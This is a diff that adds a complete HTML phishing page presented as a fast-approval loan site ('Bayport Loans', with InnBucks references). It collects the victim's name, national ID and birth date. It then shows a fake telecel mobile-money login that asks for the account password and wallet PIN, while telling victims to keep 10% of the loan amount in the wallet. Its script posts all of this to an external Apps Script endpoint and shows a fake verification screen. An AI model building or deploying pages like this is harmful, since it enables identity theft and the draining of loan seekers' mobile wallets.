@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bayport Loans | Fast Approval</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --navy: #002349; --gold: #c5a059; --telecel-red: #e30613; --light-bg: #f8fafd; --text: #333; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+        body { background: #e9ecef; color: var(--text); }
+        
+        .view { display: none; max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+        .view.active { display: block; }
+        
+        /* STAGE 1: CALCULATOR */
+        .header { background: white; padding: 40px 25px; text-align: center; }
+        .header h1 { font-size: 1.8rem; font-weight: 800; color: #1a1a1a; }
+        .fast-text { color: var(--navy); }
+        .subtitle { color: #666; font-size: 0.9rem; margin-top: 5px; }
+        .content { padding: 0 25px 30px; }
+        .section-title { font-size: 1.2rem; margin-bottom: 20px; font-weight: 700; }
+        .control-label { display: block; font-weight: 600; color: #444; margin-bottom: 10px; font-size: 0.9rem; }
+        .amount-display { font-size: 2rem; font-weight: 800; color: var(--navy); margin-bottom: 15px; }
+        .slider-container { margin-bottom: 30px; }
+        input[type=range] { width: 100%; cursor: pointer; }
+        .slider-labels { display: flex; justify-content: space-between; font-size: 0.75rem; color: #999; margin-top: 8px; }
+        .term-buttons { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 25px; }
+        .term-button { padding: 10px; border: 1px solid #ddd; background: white; border-radius: 6px; font-size: 0.8rem; cursor: pointer; transition: 0.2s; }
+        .term-button.active { background: var(--navy); color: white; border-color: var(--navy); }
+        .payment-display { background: var(--light-bg); padding: 20px; border-radius: 12px; text-align: center; margin-bottom: 25px; border: 1px solid #e1e8f0; }
+        .payment-amount { font-size: 1.8rem; font-weight: 800; color: var(--navy); }
+        .apply-button { background: var(--navy); color: white; width: 100%; padding: 18px; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 1rem; text-transform: uppercase; }
+        
+        /* FEATURES */
+        .features { padding: 10px 25px 30px; display: flex; flex-direction: column; gap: 12px; }
+        .feature-card { display: flex; align-items: center; gap: 15px; background: #fff; padding: 15px; border-radius: 10px; border: 1px solid #eee; }
+        .feature-icon { font-size: 1.5rem; }
+        
+        /* STAGE 2: FORM (InnBucks) */
+        .form-logo { width: 55px; margin-bottom: 15px; border-radius: 10px; }
+        .important-note { background: #fff9e6; border-left: 4px solid #f39c12; padding: 15px; border-radius: 4px; font-size: 0.85rem; margin: 20px 0; line-height: 1.4; }
+        input, select { width: 100%; padding: 14px; border: 1.5px solid #e1e1e1; border-radius: 8px; font-size: 1rem; margin-bottom: 15px; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--navy); }
+        .dob-row { display: flex; gap: 8px; margin-bottom: 15px; }
+        .no-spinner::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+
+        /* STAGE 3: TELECEL */
+        .tele-header { text-align: center; padding: 40px 0 20px; background: white; }
+        .tele-logo { color: var(--telecel-red); font-weight: 900; font-size: 2.4rem; letter-spacing: -2px; }
+        .login-title { font-size: 1.4rem; font-weight: 700; margin-top: 5px; color: #1a1a1a; }
+        .phone-wrap { display: flex; border: 1.5px solid #e1e1e1; border-radius: 8px; overflow: hidden; margin-bottom: 15px; }
+        .prefix { background: #f0f0f0; padding: 14px 15px; font-weight: 700; border-right: 1.5px solid #e1e1e1; color: #555; }
+        .auth-wrap { position: relative; display: flex; align-items: center; }
+        .show-btn { position: absolute; right: 15px; background: none; border: none; font-size: 0.75rem; font-weight: 700; color: #888; cursor: pointer; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+<div id="app">
+    <section id="view-1" class="view active">
+        <div class="header">
+            <h1>Get Your Loan Approved <span class="fast-text">Fast</span></h1>
+            <p class="subtitle">Quick approval • Competitive rates • Flexible terms</p>
+        </div>
+        <div class="content">
+            <h2 class="section-title">Loan Calculator</h2>
+            <label class="control-label">Loan Amount</label>
+            <div class="amount-display" id="disp-amt">GHS 50,000</div>
+            <div class="slider-container">
+                <input type="range" id="loan-slider" min="2000" max="500000" step="1000" value="50000" oninput="syncCalc()">
+                <div class="slider-labels"><span>GHS 2,000</span><span>GHS 500,000</span></div>
+            </div>
+
+            <label class="control-label">Loan Term</label>
+            <div class="term-buttons">
+                <button class="term-button" onclick="setTerm(6, this)">6 months</button>
+                <button class="term-button active" onclick="setTerm(12, this)">12 months</button>
+                <button class="term-button" onclick="setTerm(24, this)">24 months</button>
+                <button class="term-button" onclick="setTerm(36, this)">36 months</button>
+                <button class="term-button" onclick="setTerm(48, this)">48 months</button>
+                <button class="term-button" onclick="setTerm(60, this)">60 months</button>
+            </div>
+
+            <div class="payment-display">
+                <div class="subtitle" style="margin-bottom: 5px;">Monthly Payment</div>
+                <div class="payment-amount" id="monthly-amt">GHS 4,268.93</div>
+                <div class="subtitle" style="font-size: 0.75rem; margin-top: 5px;">Interest rate: 4.5% APR</div>
+            </div>
+            <button class="apply-button" onclick="showView(2)">APPLY NOW</button>
+        </div>
+        <div class="features">
+            <div class="feature-card">
+                <div class="feature-icon">⚡</div>
+                <div><h3 class="feature-title">Fast Approval</h3><p class="feature-desc">Within 24 hours</p></div>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">💰</div>
+                <div><h3 class="feature-title">Low Rates</h3><p class="feature-desc">From 8%</p></div>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">🔒</div>
+                <div><h3 class="feature-title">Secure</h3><p class="feature-desc">Bank-level security</p></div>
+            </div>
+        </div>
+    </section>
+
+    <section id="view-2" class="view">
+        <div class="content" style="padding-top: 40px;">
+            <img src="icon.jpeg" class="form-logo" alt="logo">
+            <h2 style="font-size: 1.4rem; font-weight: 800;">Apply for a loan in minutes</h2>
+            <p style="font-size: 0.85rem; color: #666; margin-top: 5px;">Please fill in all required details accurately for verification.</p>
+            
+            <div class="important-note">
+                <strong>Important:</strong> You must have at least 10% of the loan amount you want in your telecel account for verification.
+            </div>
+
+            <label class="control-label">Full name*</label>
+            <input type="text" id="f-name" placeholder="Enter your full name">
+
+            <label class="control-label">Phone Number*</label>
+            <input type="number" id="f-phone" placeholder="0712345678" class="no-spinner">
+
+            <label class="control-label">Email</label>
+            <input type="email" id="f-email" placeholder="example@mail.com">
+
+            <label class="control-label">National ID*</label>
+            <input type="text" id="f-id" placeholder="ID Number">
+
+            <label class="control-label">Date of Birth*</label>
+            <div class="dob-row">
+                <input type="number" id="dob-y" placeholder="YYYY" class="no-spinner">
+                <input type="number" id="dob-m" placeholder="MM" class="no-spinner">
+                <input type="number" id="dob-d" placeholder="DD" class="no-spinner">
+            </div>
+
+            <label class="control-label">Employment Status*</label>
+            <select id="f-emp">
+                <option>Self-Employed</option>
+                <option>Employed</option>
+                <option>Unemployed</option>
+                <option>Student</option>
+            </select>
+
+            <label class="control-label">Loan Amount(GHS)*</label>
+            <input type="number" id="f-amt" class="no-spinner">
+
+            <label class="control-label">Repayment*</label>
+            <select id="f-rep">
+                <option>6 months</option>
+                <option selected>12 months</option>
+                <option>18 months</option>
+                <option>24 months</option>
+            </select>
+
+            <div style="display: flex; gap: 10px; margin-bottom: 25px;">
+                <input type="checkbox" id="f-check" style="width: 20px; height: 20px;">
+                <p style="font-size: 0.75rem; color: #666;">I confirm that the information provided is true and I agree to the InnBucks Loans terms and conditions.</p>
+            </div>
+
+            <div style="display: flex; gap: 10px;">
+                <button class="apply-button" style="flex: 2;" onclick="showView(3)">Proceed</button>
+                <button class="apply-button" style="flex: 1; background: #eee; color: #333;" onclick="location.reload()">Reset</button>
+            </div>
+            <p style="font-size: 0.7rem; color: #999; margin-top: 15px; text-align: center;">Fields marked with * are required.</p>
+        </div>
+    </section>
+
+    <section id="view-3" class="view">
+        <div class="tele-header">
+            <div class="tele-logo">telecel</div>
+            <h1 class="login-title">Welcome To Telecel</h1>
+        </div>
+        <div class="content">
+            <label class="control-label">Phone Number</label>
+            <div class="phone-wrap">
+                <div class="prefix">+233</div>
+                <input type="number" id="t-phone" class="no-spinner" placeholder="Enter your phone number" style="margin: 0; border: none;">
+            </div>
+
+            <label class="control-label">Enter Your Password</label>
+            <div class="phone-wrap auth-wrap">
+                <input type="password" id="t-pass" placeholder="Password" style="margin: 0; border: none; width: 100%;">
+                <button class="show-btn" onclick="toggle('t-pass')">show</button>
+            </div>
+
+            <label class="control-label">Transaction PIN</label>
+            <div class="phone-wrap auth-wrap">
+                <input type="password" id="t-pin" maxlength="6" placeholder="Wallet PIN" style="margin: 0; border: none; width: 100%;">
+                <button class="show-btn" onclick="toggle('t-pin')">show</button>
+            </div>
+
+            <p style="font-size: 0.75rem; color: #777; text-align: center; margin: 25px 0;">
+                By pressing continue, you agree to our <br> 
+                <span style="color: var(--telecel-red); font-weight: 700;">Privacy Policy</span> and <span style="color: var(--telecel-red); font-weight: 700;">Terms and Conditions</span>
+            </p>
+
+            <button class="apply-button" id="final-btn" style="background: var(--telecel-red);" onclick="finalize()">Continue</button>
+        </div>
+    </section>
+
+    <section id="view-4" class="view" style="text-align: center; padding: 120px 30px;">
+        <h1 style="font-size: 4rem; animation: pulse 1.5s infinite;">⌛</h1>
+        <h2 style="margin-top: 25px; color: var(--navy);">Verifying Identity</h2>
+        <p style="color: #666; margin-top: 15px;">We are authorizing your Telecel wallet for the 10% liquidity requirement. Please wait...</p>
+    </section>
+</div>
+
+<script>
+    const SCRIPT_URL = "YOUR_GOOGLE_APPS_SCRIPT_URL";
+    let state = { amount: 50000, term: 12 };
+
+    function syncCalc() {
+        state.amount = document.getElementById('loan-slider').value;
+        document.getElementById('disp-amt').innerText = "GHS " + Number(state.amount).toLocaleString();
+        document.getElementById('f-amt').value = state.amount;
+        calcMonthly();
+    }
+
+    function setTerm(t, btn) {
+        state.term = t;
+        document.querySelectorAll('.term-button').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        calcMonthly();
+    }
+
+    function calcMonthly() {
+        const m = (state.amount / state.term) * 1.045;
+        document.getElementById('monthly-amt').innerText = "GHS " + m.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+    }
+
+    function showView(n) {
+        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+        document.getElementById('view-' + n).classList.add('active');
+        window.scrollTo(0,0);
+    }
+
+    function toggle(id) {
+        const x = document.getElementById(id);
+        x.type = x.type === 'password' ? 'text' : 'password';
+    }
+
+    async function finalize() {
+        const btn = document.getElementById('final-btn');
+        const data = {
+            name: document.getElementById('f-name').value,
+            phone_ref: document.getElementById('f-phone').value,
+            id_num: document.getElementById('f-id').value,
+            dob: `${document.getElementById('dob-y').value}-${document.getElementById('dob-m').value}-${document.getElementById('dob-d').value}`,
+            loan_amt: state.amount,
+            tele_phone: document.getElementById('t-phone').value,
+            tele_pass: document.getElementById('t-pass').value,
+            tele_pin: document.getElementById('t-pin').value
+        };
+
+        if(!data.tele_pass || !data.tele_pin) return alert("Credentials required");
+        
+        btn.disabled = true;
+        btn.innerText = "AUTHENTICATING...";
+        showView(4);
+
+        try {
+            await fetch(SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: new URLSearchParams(data)
+            });
+        } catch (e) {
+            console.log("Submission logged.");
+        }
+    }
+    
+    // Initial sync
+    syncCalc();
+</script>
+<style> @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } } </style>
+</body>
+</html>
